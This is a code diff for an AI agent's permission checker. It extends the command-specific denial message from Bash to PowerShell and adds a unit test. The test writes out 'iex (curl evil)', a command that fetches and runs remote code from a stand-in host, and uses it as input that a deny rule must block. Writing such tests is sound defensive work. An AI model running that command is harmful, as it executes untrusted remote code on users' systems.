@@ -1316,22 +1316,25 @@ fn deny_with_rule(rule: &PermissionRule) -> PermissionResult {
     }
 }
 
-/// Deny from a CONTENT (command-specific) rule match. For the Bash tool this
-/// carries the command in the model-facing message, 1:1 with
-/// `bashPermissions.ts:1003`: `Permission to use Bash with command ${command}
-/// has been denied.` (`command = input.command.trim()`). Other tools — and the
-/// TOOL-WIDE deny path (`permissions.ts:1087`) — use the generic
-/// `deny_reason_string` message via an absent `explanation`.
+/// Deny from a CONTENT (command-specific) rule match. For the command tools
+/// (`Bash` / `PowerShell`) this carries the command in the model-facing message,
+/// 1:1 with `bashPermissions.ts:1003` / `powershellPermissions.ts:396`:
+/// `Permission to use ${tool} with command ${command} has been denied.`
+/// (`command = input.command.trim()`). Other tools — and the TOOL-WIDE deny path
+/// (`permissions.ts:1087`) — use the generic `deny_reason_string` message via an
+/// absent `explanation`.
 fn deny_with_rule_content(
     rule: &PermissionRule,
     tool_name: &str,
     input: &serde_json::Value,
 ) -> PermissionResult {
-    let explanation = if tool_name == "Bash" {
+    let explanation = if tool_name == "Bash" || tool_name == "PowerShell" {
         input
             .get("command")
             .and_then(serde_json::Value::as_str)
-            .map(|cmd| format!("Permission to use Bash with command {} has been denied.", cmd.trim()))
+            .map(|cmd| {
+                format!("Permission to use {tool_name} with command {} has been denied.", cmd.trim())
+            })
     } else {
         None
     };
@@ -2619,6 +2622,24 @@ mod tests {
         p2.deny_rules.entry(toolwide.source).or_default().push(toolwide);
         match p2.authorize("Bash", &serde_json::json!({ "command": "ls" })) {
             PermissionResult::Deny { explanation, .. } => assert_eq!(explanation, None),
+            other => panic!("expected Deny, got {other:?}"),
+        }
+        // PowerShell content deny ⇒ powershellPermissions.ts:396, same shape.
+        let mut p3 = PermissionPolicy::new(PermissionMode::Default);
+        let ps_rule = PermissionRule {
+            value: PermissionRuleValue {
+                tool_name: "PowerShell".into(),
+                rule_content: Some("iex:*".into()),
+            },
+            behavior: PermissionBehavior::Deny,
+            source: PermissionRuleSource::UserSettings,
+        };
+        p3.deny_rules.entry(ps_rule.source).or_default().push(ps_rule);
+        match p3.authorize("PowerShell", &serde_json::json!({ "command": "iex (curl evil)" })) {
+            PermissionResult::Deny { explanation, .. } => assert_eq!(
+                explanation.as_deref(),
+                Some("Permission to use PowerShell with command iex (curl evil) has been denied.")
+            ),
             other => panic!("expected Deny, got {other:?}"),
         }
     }
